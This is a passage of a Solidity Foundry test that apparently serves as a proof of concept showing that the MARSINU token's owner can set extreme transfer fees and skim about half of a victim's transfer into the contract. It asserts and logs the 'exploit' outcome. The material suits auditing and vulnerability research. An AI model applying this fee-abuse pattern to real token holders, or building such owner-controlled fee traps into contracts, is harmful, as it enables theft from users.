        address recipient = address(0x888);
        vm.label(recipient, "Recipient");

        // Record balances before transfer
        uint256 victimBalanceBefore = MARSINU(TARGET).balanceOf(simpleVictim);
        uint256 contractBalanceBefore = MARSINU(TARGET).balanceOf(TARGET);
        uint256 recipientBalanceBefore = MARSINU(TARGET).balanceOf(recipient);

        // Have victim transfer tokens
        vm.prank(simpleVictim);
        uint256 transferAmount = 100_000 * 10**9; // 10% of victim's balance
        console.log("\nVictim transferring:", transferAmount);

        bool success = MARSINU(TARGET).transfer(recipient, transferAmount);
        require(success, "Transfer failed");

        // Check balances after transfer
        uint256 victimBalanceAfter = MARSINU(TARGET).balanceOf(simpleVictim);
        uint256 contractBalanceAfter = MARSINU(TARGET).balanceOf(TARGET);
        uint256 recipientBalanceAfter = MARSINU(TARGET).balanceOf(recipient);

        console.log("\n=== After Transfer ===");
        console.log("Victim balance after:", victimBalanceAfter);
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Recipient balance after:", recipientBalanceAfter);

        // Calculate changes
        uint256 victimLoss = victimBalanceBefore - victimBalanceAfter;
        uint256 contractGain = contractBalanceAfter - contractBalanceBefore;
        uint256 recipientGain = recipientBalanceAfter - recipientBalanceBefore;

        console.log("\n=== Results ===");
        console.log("Victim lost:", victimLoss);
        console.log("Contract gained:", contractGain);
        console.log("Recipient gained:", recipientGain);
        console.log("Transfer amount:", transferAmount);

        // With 50% fees, recipient should get ~50% of transfer amount
        // Victim should lose approximately transfer amount
        // Contract should gain approximately 50% of transfer amount

        console.log("\nExpected with 50% fees:");
        console.log("- Recipient should get ~", transferAmount / 2);
        console.log("- Contract should get ~", transferAmount / 2);
        console.log("- Victim should lose ~", transferAmount);

        // Verify the exploit
        // 1. Contract accumulated fees
        assertGt(contractBalanceAfter, contractBalanceBefore, "Contract should have accumulated fees");

        // 2. Recipient received significantly less than transfer amount due to fees
        assertLt(recipientGain, transferAmount * 3 / 4, "Recipient received less due to high fees");

        // 3. Show owner can change fees at will (demonstrating control)
        vm.prank(owner);
        MARSINU(TARGET).setTaxFeePercent(10);
        MARSINU(TARGET).setLiquidityFeePercent(10);
        console.log("\n✓ Owner demonstrated control by resetting fees to 20% total");

        console.log("\n✓ Exploit successful: Owner abused privileges to set high fees");
        console.log("✓ Victim's transfer was heavily taxed");
        console.log("✓ Contract accumulated fees that owner controls");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
